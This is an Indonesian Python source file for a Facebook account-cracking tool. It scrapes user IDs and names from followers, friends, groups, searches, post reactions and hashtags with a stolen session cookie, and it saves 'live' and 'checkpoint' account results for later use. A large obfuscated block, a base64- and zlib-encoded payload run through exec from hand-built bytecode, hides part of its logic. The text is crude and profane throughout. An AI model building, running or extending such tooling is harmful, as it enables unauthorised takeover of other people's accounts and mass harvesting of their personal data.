# update Rabu 7 April 2021
# coded by Aap Afandi
# rekod mulu ngentod:v
# fb me : https://m.facebook.com/Kang.Pacman
import os,sys,re,json,random
from time import sleep as waktu
from shutil import rmtree as hapus
from concurrent.futures import ThreadPoolExecutor as Bool
ok=0
cp=0
cot=0
live=[]
chek=[]
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:
	import requests as req
except ModuleNotFoundError:
	os.system("python -m pip install requests");restart()
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	os.system("python -m pip install bs4");restart()
uag="NokiaX3-00/2.0 (p) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
try:hapus("__pycache__")
except:pass
try:hapus("kentod/__pycache__")
except:pass
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		print(f"\n\n[✓] \x1b[1;35mDone Bro\n\x1b[0m[*] \x1b[1;32mLIVE\x1b[0m/\x1b[1;33mCHEK \x1b[0m: \x1b[1;32m{len(ngocok)}\x1b[0m/\x1b[1;33m{len(ismylife)}\x1b[0m")
		if len(ngocok)==0:pass
		else:print("[*] \x1b[1;32mHasil Live Tersimpan Di File : live.txt\x1b[0m")
		if len(ismylife)==0:pass
		else:print("[*] \x1b[1;33mHasil Chek Tersimpan Di File : chek.txt")
		exit()
	else:exit("\n\n\x1b[1;31m[!] Tidak Mendapatkan Hasil:(")
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'eJxdWMmu7Lp1rfPufdf3vXTOMH8QW4BVKvWAbUQqNVVSqe9lIBcq9X3fFTJ7+RAHyMS/dKYZeexZRtFxjCSICK5NUdLmJkVyL+7/OP2/6++P/E9H/hN7QHSK3v715J/it/hUfPfTm/8p/hR995f0KfocfR99iX4WfY1+iH6M/ir666P09aefx6dv38Wnn05vp+hvjNMPf/jb8O3/NPD2l3w98vj5gH85GadfvMl/OOD9bRs+HVV/hv/8B3CMwmCIwKhdm6oNInBqI7Bq0/b966+roH5GwW8/XvzTh9rhywF//Cj98ccP+OjD+M8HvH4ZH/ZHp5/efv/dId8O+emQR29+/zn69G9vH+mnt7eTc2p+9fkUf1/+OLhvJ//L2+n18/hn8df4y09/eY6eos/+l999cU/eqfnOPe4Ow79//1kdDGMWVO+fX1X+fP/yDMYYQ8Z//7vTKRa2yCYapeO6/TUAtQPZs0NGj+V8S/S6u2+l3k/aKgistJcX/WrsyPYCFSmuIqBUg90FajeC8CiKASJccNfG/aqYxUe40lxD00RoPAAEZMChIYm9IEDUAUeWEBhAFRcaDLXFMm6gDMMcGJEkgxIkMCE3GLmrSJCsGXh9AbxL8AsSAdzSDKoKw4DETGCse8mSodGhJ6mRcErAnUMAk1DcBrMJSOGZM4gQBEuAqpGDqiUMOzmAIIpiW4K8YOKavZgVyCipxqyZ3wl22z123/3OLUCwTbReBU0AUJ85TOIS2QExoapPXImXJ0g5K0gtJpmB3AuGbxsGLOCrgm0FVFUX72CUJ9BQRZLDSLh8whAZM0vEgMmoZkBWEE8bXOhXaO7ADQyT9qh7kUqDDwSwaWBBg4nRmAjAhFiRqD42oIQHLguqxclFi2d3yHBYAuVIXYqIVZjjqwuhZOcs1PC59TtdKi6uqw9edNGwGR/mq3uO+7Bsay8MRIlkxxJqL+UFaSNb4eIpal9PK5mZK6Vnu33eNnkjqRiwMRSnViG/JqPBb+3YUx03hupGhXZhZiIDiufKo4Y29/SAv473kWcIwdAaKk36gEOgkfUm1UPgkDrTcRkiNG3lXZiaZa8VXjVQDBrw91X2uvZursut1AykNg2NT3X1Fu7Ui31Ql7qaOz1Hx5xxppUSVvV+30YFKrAQO1eB1jGORvBs35XLubS1MbAUVfKgVvXszlutJLHmGJcii7BSUR836aYmeNG9zlS34/eV7tfRTYI1ZUU0WL1S4kfPYdknzWk1BKT0WUhjY56n1kaoWhskhmQyIdVu+cVEHyuuB4mUX0NtZYrVS1NkqP1U1nI5whMqopHtVjovdHZSHBEvCOAfpnVsnRCsca1uWT7eykq4KNUieemZ1cSXlr5UOdy34DqEHrbcz+0UApE3KUUpiFc+nPLF4ypdDJgrJN+dtPY5sXq6zVx7QgQ929JAi1taZE9hxa9OvGf32ywzAxpxj2nx9Qd2MZ+91t98J2U5Q5l5QUci64oG5/EWSUN2k/eL7doPOanOxV4khXjRVb26iJAwrUNpDWLUlPuLx/JHY5B2xslkj+fuXUadqAjcUYLiUebtixJmSXCdw9vzZuFhPI9bNstJXcyM8rSlLFYfDJxwbGjFV+OuBddQDLCUQrgeMhVVvsDacxQcuiqK2k5fIMA3l2os9TjO7w7rI6TGM9dgXwVZwxP0Pk/AHBbUHV+72eL2rbnJPu26CIY1YasAKVU3dHctzlNMsE9XSrXgEpdmBTh3rJ7IJyQ/JOP6nDK+i/t1VaW+8iOz1KFAfD2m5NFRSlihg6tT/WtNBG/Ah/YhZSXXYI4Rx6y1oARuEJoWWKGBQJjX55lmn/0tiT2s7D26YVmWHG+4yKJCLaak4zNmZMe26PvVXEaGU8abscnKY3gFi3qGNO6RUr2C6P3C2nbQ7X2VRAgrqcolUuBiz/YIeWVSN+q5TlqC+YIYF3duJj4y6dhfbC4P8EVTZ3PwlVw4VlzEgbdgaONpE5nWJ3gU71GNchRDiavn8S8DrWEWYUMfPF/kTbqau+fEaNXaMIZde6blDG1Gpo3wLIoL3I5Qn3tGcqOvCTxs8JK4m5O8FFtLUCM6+bIJZOVF8LVCqmGnV1Mj5jdG8jITmdqzLC0G4rfOLcaPQb3SbU7Etc3t/npG9e0F3Vau8kt4GxGVD/WtYKpcFOIXc2+SLjH1c9j3TpXMCyW1cYTzRnfXl6y2jNkc78vz4piYzQf9pVvjiL41RhBLwmw4rhMu2u0xZMT1gqOpd9W4sAjjjRAtXFHyDrM2rQMGo6YFCWfv+yYQ2xmzzd3lWy/UbuEsk48zeZ9G/NhmkhfcPftxGlqJwKa0yu6SAAbRDISqJBxbw/IE2m2Ke9kL+60qFKt7UZSga5k5hFYTnu/NppzxMeHZct5QiMdwjRThwY6r1dwq3MQETg9QG10DiHhc8TNu8Txq4xZkO6yePs1LgjDifeJbXkpwdtzdNL5UtQTQxCunlTVbOn6CZtw5eIiiGxViTc6NTW1YajM+hzfmwvHyksc4PT6KMIUWaWMOjzPv92vUE55Jp3lMCzD0XGDodQkIr4Ckm6F2DidC19T0O8SEoyEKLxYzNqhtgBcCuysZjt4hyNt4X5RtmnlFqtWTnNZ7qaksDnJ/ertPiQg5pUPsXjnklgNQFysaroVCeTOjLF4nj+8UftuKVMrPGy5De16bPc7ILP2obMdWG7zyLYh2Q3QP8iCra9yTNvh8VpUaA7ydEp20UpKC2HPR5h7KUMAUitqWEuH1SqIgZcBh9gqKF28Et5nnAeF+MWBgqJ+Mud5h/hwUqdOSumjLTMZL5FCbBe4Mi7VVB2vy747bTpF4HzdFs/KY1OrznKk1MT5ip9gNETGHXtMBhudeL/XpECpU7ZZKjYgwDAFpOMQNmiiRf3QSnVyRwHwuCWz388ROF+HQyYQPo4Zrdn/sz/FC6vvBJJVmPj/BlE8qQRj04qzaF7Vlre7eX0fFBERD01p/wv1ine19wJ82pNqiWlNVpdEbw8GIXa1dD3LlIsirCHOA33J0CSRX/dl5csdC9gVTkydSPIqhvMnPMJpgiOj7GKbBcSSLx+SGAtxXEqYAORiTiP6waaA7NmAMh3OabFwDnkFTsmhb7juFuHNhF8EjfFfQLgVdi9jMan9hGmvVGxkLCEwf3GEj4QYhWlRIR3C079vkXgnzNvVe6OviVDjB+WJtPuk7SCU/PNpklNTV5pmarUgRTZ+lDDS++I5ZKFeWSGp59aDHQXb4IsbPD7axtRkzXyoWdgRldzuCkLwr8qh+f2rObdB1l1xax9EQ4wHZ0tBd+nrlr2BTrly+AWfdooNb+JKZa5XIgUk7Mo9VYb3isu44JTd6bO0rLQuoHPN87q5ysbIJ9D2ocgIbvXFYj0BmC3LJo29X7FjhBgC8PJbIJyzHzqSG3lg2A73MvnFbNXpXa5zqB1xIjmOZUsGX4+bUgef5gFtada7Q2eWGC81KsNh80euhZBXL6kw94my6rgd0I6oqnH3x0TF+EwCv+mmgcIGUoh3y8d3FshWxLuf1cBvCWkC3ITP3KUt0zh7NWUnvveKNaYi6V3JGegA+F1zm+skNLI254c+IaELNsy7FQasJENuV0t5fE3fZkbnyU3BOcCl9LCjICN69IB8G4AReh+TSJPt75xcM4d9VYH5N13zg6MqEZ1+f8nlEH0OzI359reyKm1tZzr2F98drFkDTubva0M01RlgFCFGM0C0j8njkaaonCPEYnOoeINas3y9Ti0rkbdnj/lhf88LC80veGO3xus/WxKQzsgnXyFQG+cHragekz11qVq5oqNHHrSyVWTIAhcgtdTDKrXpg0vuYHd67TU1LY+UlvQgYk9tPCmuUeKypKKTK+5wf/mQ+C63weITAc1Q7nDFWX5oINmq2pq+vM+x4OF735e0eJC/uoV9h7V5gePTKL0qgVC0x5TzNLC1ZyWQci5FBOp71NCEmoQU1INqOdCOloMbOWKbzWFD04lzpCoobCoZnwSufgClPSH9NLd260XIioY5e1RonHpweW10/dmslsG+NCBysDXAzZjhmgikpvGs9yuaW5ntqbuIdqB7CQ3p0Ztnq2NCsr8a25T097wN3V/GXgdEtK1zlFWnCsM5pBl1G4yCq91JuBUQdC95JgTFnt6tQ8atni3m03UGhCkjaYc5OFKej2uP32u5DNAoougTF3dGHXmYZutw52y/9HUlRRcRv6IOaXd10bj51VWL7jLuhfHiS3Kx9zFK3buQa3jv2nPCgKpAtxMox50sqMK7pUnmpUVHbVXsEtXk2Omo8o+a+yCban9eACrV0xq/XjoQaFAuXIbvkcjrFC4yjlR0tZwSPlmEDE2AwM9IZPdqCbXJij1MIvoWJPvFWsLhkCuVyuwXA4FZAAXnk1JBJgSVZgbtbD4C2Wmw4Cd7GOQEhCkJsnU/AFzrYbAgXPR4hSbIkG2LdcIxQhx1PXGZ+uDoGRAtMYpLaQUAsq+DlVQAyvBHrvICO2h+LZX2RarOSCfNcYYJmLoVaUr/5jfyLH94/x1scvv/47Vted+0wffv2/v1HvGF8/zGKw7buhngc3394YsjHbRS//8BuYdxNedu8v8Xv33dD3kzvnw728ufAxetL+0x+dZz4v/66bqO5in/7x4+Ax/gRofju9Mu3n5/kX3x+f/v2/nnau/j967dvH0qPRj9/yP8NgPw3fH/A+/9o+nO840PR19OPp388/RcoKL1q', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'obf.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=kueh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[AapAfandiGanteng]"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[AapAfandiGanteng]"+c[1])
							print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
					if "Lihat Postingan Lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
	def teangan(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				elif "?refid=" in softek[1]:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				else:
					self.id.append(softek[1]+"[AapAfandiGanteng]"+softek[2])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print("[!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def hastag(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ class\=\".."\ href\=\"(.*?)__tn__=C">(.*?)</a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					tol=re.search("profile.php\?id=(\\d*)",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[AapAfandiGanteng]"+softek[1])
				else:
					tol=re.search("/(.*?)\?",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.hastag(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def saran(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',kontol)
			if len(memek)!=0:
				for softek in memek:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
					print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
					if len(self.id)==jum:
						true=True
						break
			if true==False:
				if "Lihat selengkapnya" in kontol:
					self.saran(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:pass
	def menu(self):
		about().tentang()
		pilih=input("[?] Pilih : ")
		if pilih in["1","01"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.folower(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["2","02"]:
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while True:
				kontol=input("[?] Masukkan Id Grup : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						else:
							print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
							print("[!] Tekan CTRL + C Jika Ingin Langsung Crack")
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["4","04"]:
			while True:
				kontol=input("[?] Nama : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"[!] Pengguna Dengan Nama {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.teangan(f"{self.url}/search/people/?q={kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih in["5","05"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"[!] Daftar Teman Tidak Di Publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.flrencang(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("[!] Permintaan Pertemanan Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["7","07"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Saran" in ajg:
					print("[!] Tidak Ada Permintaan Terkirim Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					jumlah=int(input("[?] Jumlah : "))
					if "5000" in str(jumlah):
						jumlah-=1
					if jumlah<5001:
						self.saran(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",jumlah)
					else: exit("[!] Max 5000 User")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except ValueError:
				exit("[!] Isi Yang Bener Ajg")
		elif pilih in["8","08"]:
			kontol=input("[?] Url/Id Postingan : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"[!] Posting Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print("[!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except req.exceptions.MissingSchema:
				print(f"[!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
		elif pilih in["9","09"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/suggestions",cookies=kueh).text
				if "Tidak Ada Saran" in ajg:
					print("[!] Tidak Ada Saran Teman");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					jumlah=int(input("[?] Jumlah : "))
					if "5000" in str(jumlah):
						jumlah-=1
					if jumlah<5001:
						self.saran(f"{self.url}/friends/center/suggestions",jumlah)
					else: exit("[!] Max 5000 User")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except ValueError:
				exit("[!] Isi Yang Bener Ajg")
		elif pilih=="10":
			while True:
				kontol=input("[?] Hashtag : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg or "Halaman yang Anda minta tidak ditemukan." in ajg:
							print(f"[!] Hashtag {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
							print(f"[!] Postingan Dengan Hashtag {kontol} Disembunyikan Karna Melanggar Standar Komunitas Fb");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.hastag(f"{self.url}/hashtag/{kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih=="11":
			print("\n[L] Lihat Hasil Crack")
			print("[R] Laporkan Masalah")
			print("[U] Update Script")
			print("[H] Hapus Cookie")
			print("[I] Info Script")
			print("[B] Kembali")
			print("[K] Keluar\n")
			self.fuck()
		elif pilih in["0","00"]:
			exit("[*] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");waktu(0.8);self.menu()
		else:
			print("[!] Pilihan Tidak Ada");self.menu()
		if len(self.id)!=0:
			print("")
			self.askk()
		else:
			print("[!] Gagal Mengambil ID, Silahkan Coba Lagi");waktu(1.5);self.menu()
	def fuck(self):
		pilih=input("[?] Pilih : ")
		if pilih in["l","L"]:
			tod=open("live.txt","r").read()
			tOd=open("chek.txt","r").read()
			if len(tod)==0 or "|" not in tod:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Live")
			else:
				print("\n\x1b[1;32m[Result Live]\n")
				print(tod)
